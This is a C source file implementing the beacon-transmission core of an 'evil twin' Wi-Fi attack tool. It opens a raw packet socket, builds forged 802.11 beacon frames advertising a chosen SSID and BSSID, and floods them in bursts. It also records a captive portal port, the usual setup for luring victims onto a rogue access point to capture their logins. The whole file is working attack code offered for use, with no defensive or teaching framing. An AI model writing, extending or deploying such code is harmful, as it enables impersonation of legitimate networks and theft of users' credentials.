#include "eviltwin_v3.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <linux/if_packet.h>
#include <linux/wireless.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <time.h>

#define V3_RADIOTAP_LEN 12
#define V3_BURST_SIZE 64
#define V3_FRAME_MAX 256
#define V3_SHM_PATH "/tmp/eviltwin_v3.pid"
#define V3_STAT_WRITE_INTERVAL 100

typedef struct {
    pid_t pid;
    int port;
    volatile long long sent;
    volatile int running;
} v3_shm_t;

static volatile int g_v3_running = 0;
static pthread_t g_v3_thread;
static long long g_v3_sent = 0;
static int g_v3_fd = -1;
static char* g_v3_iface = NULL;
static char* g_v3_ssid = NULL;
static uint8_t g_v3_bssid[6];
static uint8_t g_v3_channel = 1;
static uint16_t g_v3_seq = 0;
static int g_v3_port = 0;

static int g_v3_shm_fd = -1;
static v3_shm_t* g_v3_shm = NULL;

static int _raw_socket(const char* iface) {
    struct sockaddr_ll sll;
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { close(fd); return -1; }
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (bind(fd, (struct sockaddr*)&sll, sizeof(sll)) < 0) { close(fd); return -1; }
    return fd;
}

static void _set_channel(const char* iface, int ch) {
    struct iwreq wr;
    memset(&wr, 0, sizeof(wr));
    strncpy(wr.ifr_name, iface, IFNAMSIZ - 1);
    int freq = (ch <= 13) ? (2407 + ch * 5) : (5000 + ch * 5);
    wr.u.freq.m = freq;
    wr.u.freq.e = 6;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return;
    ioctl(fd, SIOCSIWFREQ, &wr);
    close(fd);
}

static int _build_beacon(uint8_t* buf, const char* ssid, const uint8_t* bssid, uint8_t channel) {
    int ssid_len = (int)strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;
    memset(buf, 0, V3_FRAME_MAX);
    buf[2] = (uint8_t)(V3_RADIOTAP_LEN & 0xFF);
    buf[3] = (uint8_t)((V3_RADIOTAP_LEN >> 8) & 0xFF);
    int off = V3_RADIOTAP_LEN;
    buf[off] = 0x80; buf[off + 1] = 0x00;
    buf[off + 2] = 0x00; buf[off + 3] = 0x00;
    memset(&buf[off + 4], 0xFF, 6);
    memcpy(&buf[off + 10], bssid, 6);
    memcpy(&buf[off + 16], bssid, 6);
    buf[off + 22] = (uint8_t)((g_v3_seq & 0x0F) << 4);
    buf[off + 23] = (uint8_t)((g_v3_seq >> 4) & 0xFF);
    g_v3_seq = (g_v3_seq + 1) & 0xFFF;
    off += 24;
    uint64_t ts = (uint64_t)(time(NULL) * 1000000ULL);
    memcpy(&buf[off], &ts, 8); off += 8;
    buf[off] = 0x64; buf[off + 1] = 0x00;
    off += 2;
    buf[off] = 0x11; buf[off + 1] = 0x04;
    off += 2;
    buf[off] = 0x00; buf[off + 1] = (uint8_t)ssid_len;
    memcpy(&buf[off + 2], ssid, (size_t)ssid_len);
    off += 2 + ssid_len;
    buf[off] = 0x01; buf[off + 1] = 8;
    memset(&buf[off + 2], 0x82, 8);
    off += 10;
    buf[off] = 0x03; buf[off + 1] = 1;
    buf[off + 2] = channel;
    off += 3;
    return off;
}

static int _shm_init(void) {
    g_v3_shm_fd = open(V3_SHM_PATH, O_RDWR | O_CREAT, 0644);
    if (g_v3_shm_fd < 0) return -1;
    ftruncate(g_v3_shm_fd, (off_t)sizeof(v3_shm_t));
    g_v3_shm = (v3_shm_t*)mmap(NULL, sizeof(v3_shm_t), PROT_READ | PROT_WRITE,
                                MAP_SHARED, g_v3_shm_fd, 0);
    if (g_v3_shm == MAP_FAILED) {
        close(g_v3_shm_fd);
        g_v3_shm_fd = -1;
        g_v3_shm = NULL;
        return -1;
    }
    memset(g_v3_shm, 0, sizeof(v3_shm_t));
    g_v3_shm->pid = getpid();
    g_v3_shm->port = g_v3_port;
    g_v3_shm->running = 1;
    return 0;
}

static void _shm_cleanup(void) {
    if (g_v3_shm) {
        g_v3_shm->running = 0;
        munmap((void*)g_v3_shm, sizeof(v3_shm_t));
        g_v3_shm = NULL;
    }
    if (g_v3_shm_fd >= 0) {
        close(g_v3_shm_fd);
        g_v3_shm_fd = -1;
    }
    unlink(V3_SHM_PATH);
}

static void* _v3_thread(void* arg) {
    (void)arg;
    int fd = _raw_socket(g_v3_iface);
    if (fd < 0) return NULL;
    g_v3_fd = fd;
    _set_channel(g_v3_iface, g_v3_channel);
    uint8_t frames[V3_BURST_SIZE][V3_FRAME_MAX];
    struct mmsghdr msgs[V3_BURST_SIZE];
    struct iovec iov[V3_BURST_SIZE];
    int frame_len = _build_beacon(frames[0], g_v3_ssid, g_v3_bssid, g_v3_channel);
    long long iter = 0;
    while (g_v3_running) {
        int count = 0;
        for (int i = 0; i < V3_BURST_SIZE && g_v3_running; i++) {
            if (i > 0) memcpy(frames[i], frames[0], (size_t)frame_len);
            iov[count].iov_base = frames[count];
            iov[count].iov_len = (size_t)frame_len;
            msgs[count].msg_hdr = (struct msghdr){.msg_iov = &iov[count], .msg_iovlen = 1};
            count++;
        }
        int sent = sendmmsg(fd, msgs, (unsigned)count, 0);
        if (sent > 0) {
            __sync_fetch_and_add(&g_v3_sent, sent);
            iter++;
            if (g_v3_shm && (iter % V3_STAT_WRITE_INTERVAL) == 0) {
                g_v3_shm->sent = g_v3_sent;
            }
        }
    }
    close(fd);
    g_v3_fd = -1;
    return NULL;
}

int eviltwin_v3_start(const char* iface, const char* ssid, const uint8_t* bssid, uint8_t channel, int captive_port) {
    if (g_v3_running) eviltwin_v3_stop();
    g_v3_iface = strdup(iface);
    g_v3_ssid = strdup(ssid);
    memcpy(g_v3_bssid, bssid, 6);
    g_v3_channel = channel;
    g_v3_port = captive_port;
    g_v3_sent = 0;
    if (_shm_init() != 0) {
        free(g_v3_iface); g_v3_iface = NULL;
        free(g_v3_ssid); g_v3_ssid = NULL;
        return -1;
    }
    g_v3_running = 1;
    if (pthread_create(&g_v3_thread, NULL, _v3_thread, NULL) != 0) {
        g_v3_running = 0;
        _shm_cleanup();
        free(g_v3_iface); g_v3_iface = NULL;
        free(g_v3_ssid); g_v3_ssid = NULL;
        return -1;
    }
    return 0;
}

void eviltwin_v3_stop(void) {
    if (g_v3_running) {
        g_v3_running = 0;
        pthread_join(g_v3_thread, NULL);
    }
    _shm_cleanup();
    free(g_v3_iface); g_v3_iface = NULL;
    free(g_v3_ssid); g_v3_ssid = NULL;
}

long long eviltwin_v3_sent(void) {
    return g_v3_sent;
}
